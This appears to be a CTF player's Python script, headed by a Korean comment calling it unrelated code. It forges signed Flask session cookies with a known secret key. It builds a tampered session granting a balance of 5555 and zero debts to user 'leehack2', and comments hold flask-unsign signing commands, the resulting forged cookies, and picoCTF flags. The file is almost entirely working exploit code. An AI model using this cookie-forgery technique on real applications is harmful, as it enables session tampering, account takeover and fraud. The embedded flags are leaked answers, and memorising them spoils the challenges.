# 상관 없는 코드 입니다.

#!/usr/bin/env python
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer


class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
    # Override method
    # Take secret_key instead of an instance of a Flask app
    def get_signing_serializer(self, secret_key):
        if not secret_key:
            return None
        signer_kwargs = dict(
            key_derivation=self.key_derivation,
            digest_method=self.digest_method
        )
        return URLSafeTimedSerializer(secret_key, salt=self.salt,
                                      serializer=self.serializer,
                                      signer_kwargs=signer_kwargs)


def encodeFlaskCookie(secret_key, cookieDict):
    sscsi = SimpleSecureCookieSessionInterface()
    signingSerializer = sscsi.get_signing_serializer(secret_key)
    return signingSerializer.dumps(cookieDict)


if __name__ == '__main__':
    sk = "[REDACTED]"
# Flaskcards Skeleton Key picoCTF{1_id_to_rule_them_all_92303c39}

    sessionDict = {'DHC': 0.0, 'DHD': 0.0, 'DHH': 5555.0, 'col_DHC': 0.0, 'debt_DHD': 0.0, 'debt_DHH': 0, 'depo_DHC': 0.0,
                   'depo_DHD': 0.0, 'name': 'leehack2'}  # Flaskcards and Freedom picoCTF{R_C_E_wont_let_me_be_85e92c3a}
    cookie = encodeFlaskCookie(sk, sessionDict)
    print(cookie)


# flask-unsign --sign --cookie "{'debt_DHH':'0'}" --secret "[REDACTED]" eJyrVnLxcFayMtAz0AGyXOAsDyUrUyAAcZLzc-IRilJSk0riESqhXCTlKakF-SjqwVyY-rzE3FQlK6Wc1NSMxORspVoA5o8hXQ.Y6ao9Q.BooryhAgMxaQIiRJAlVX9HC-gkE

# flask-unsign --sign --cookie "{'DHC': 0.0, 'DHD': 0.0, 'DHH': 5555.0, 'col_DHC': 0.0, 'debt_DHD': 0.0, 'debt_DHH': 0, 'depo_DHC': 0.0, 'depo_DHD': 0.0, 'name': 'leehack2'}" --secret "[REDACTED]" .eJyrVnLxcFayMtAz0AGyXOAsDyUrUyAAcZLzc-IRilJSk0riESqhXCTlKakF-SjqwVyY-rzE3FQlK6Wc1NSMxORspVoA5o8hXQ.Y6a5iw.-prn8HB9SwQvAuZ9HH3Fbu34pU0
